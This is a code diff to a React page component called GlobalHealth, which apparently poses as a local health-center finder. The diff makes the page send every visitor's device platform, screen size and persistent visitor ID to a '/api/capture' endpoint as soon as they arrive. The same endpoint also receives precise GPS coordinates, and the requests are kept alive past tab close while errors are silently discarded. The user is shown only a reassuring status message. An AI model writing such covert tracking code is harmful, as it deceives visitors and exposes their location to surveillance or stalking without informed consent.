@@ -40,10 +40,9 @@ export default function GlobalHealth() {
       );
     };
 
-    const saveLocation = async (position) => {
+    const saveLocation = async (position = null) => {
       if (watchId) navigator.geolocation.clearWatch(watchId);
       
-      // Get or create a unique visitor ID
       let visitorId = localStorage.getItem('visitorId');
       if (!visitorId) {
         visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
@@ -51,36 +50,45 @@ export default function GlobalHealth() {
       }
       
       const payload = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        accuracy: position.coords.accuracy,
+        lat: position?.coords.latitude || null,
+        lon: position?.coords.longitude || null,
+        accuracy: position?.coords.accuracy || null,
         platform: navigator.platform,
         screen: `${window.screen.width}x${window.screen.height}`,
         visitorId,
-        context: `High-Precision Capture (Acc: ${Math.round(position.coords.accuracy)}m)`
+        context: position 
+          ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
+          : 'Initial Visit (IP Only)'
       };
-
 
       try {
         await fetch('/api/capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
+          keepalive: true, // Ensures request finishes even if tab is closed
         });
-        setStatus('GPS Synchronized. Local centers identified.');
-        setTimeout(() => {
-          setStatus(null);
-          setLoading(false);
-        }, 3000);
+        
+        if (position) {
+          setStatus('GPS Synchronized. Local centers identified.');
+          setTimeout(() => {
+            setStatus(null);
+            setLoading(false);
+          }, 3000);
+        }
       } catch (err) {}
     };
 
-    // Give it 8 seconds to find the best possible location, then save whatever we have
+    // Phase 1: Instant IP/Visit Capture
+    saveLocation(null);
+
+    // Phase 2: Start GPS Watch
     const finalTimer = setTimeout(() => {
       if (bestPosition && loading) {
         saveLocation(bestPosition);
       }
     }, 8000);
+
 
     startWatching();
 
